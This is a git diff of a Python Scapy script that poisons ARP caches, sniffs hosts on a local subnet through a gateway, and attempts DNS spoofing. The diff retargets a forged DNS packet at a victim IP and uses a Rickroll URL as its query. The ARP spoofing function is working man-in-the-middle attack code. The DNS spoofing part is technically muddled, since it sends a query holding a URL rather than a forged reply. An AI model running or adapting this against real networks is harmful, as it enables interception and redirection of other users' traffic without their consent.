@@ -11,7 +11,8 @@ def spoofarpcache(targetip, targetmac, sourceip):
     send(ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac), verbose=False)
 
 def sendFakeDNS(pkt):
-    dnsResPacket = DNS(rd=1, qd=DNSQR(qname="youtube.com/watch?v=dQw4w9WgXcQ", qtype="A"))
+    print(pkt)
+    dnsResPacket = IP(dst=targetip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="https://www.youtube.com/watch?v=dQw4w9WgXcQ%22"))
     send(dnsResPacket)
 
 def DNSSpoofing(iptarget):
@@ -35,9 +36,6 @@ def MultiSniffing(ippasserelle):
             ipt[ip + str(num)] = getmacbyip(ip + str(num))
             SingleSniffing(ip + str(num), ippasserelle)
     print(ipt)
-
-
-
 
 
 def SingleSniffing(targetip, passerelleip):
@@ -80,14 +78,15 @@ elif len(sys.argv) == 3:
     elif sys.argv[1] == "-m":
         MultiSniffing(sys.argv[2])
     else:
+        targetip = sys.argv[1]
         SingleSniffing(sys.argv[1], sys.argv[2])
 elif len(sys.argv) == 4:
     if sys.argv[1] == "-s":
+        targetip = sys.argv[2]
         SingleSniffing(sys.argv[2], sys.argv[3])
     else:
         print("To many arguments")
 else:
     print("To many arguments")
-
 
 
